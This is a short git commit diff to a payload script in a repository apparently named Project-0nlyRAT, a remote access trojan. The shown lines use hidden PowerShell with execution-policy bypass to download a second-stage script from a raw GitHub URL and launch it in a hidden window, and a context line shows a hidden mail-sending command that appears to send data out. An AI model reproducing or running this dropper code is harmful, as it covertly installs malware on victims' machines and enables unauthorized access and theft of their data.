7548fcc6b5c1862de18ee4268f351e5f15976f24
Soumyo001 <www.soumyo@gmail.com>
2025-01-23 00:33:28 -0800

    console

--- payloads/initial.cmd
+++ payloads/initial.cmd
@@ -13,7 +13,7 @@ powershell.exe -nop -ep bypass -w hidden -c "&{Send-MailMessage -from 'defalttes
 
 
 @rem Download payload
- powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/wget.cmd' -outfile '.\wget.cmd'"
+powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/wget.cmd' -outfile '.\wget.cmd'"
 
 @rem run the payload
 powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wget.cmd"
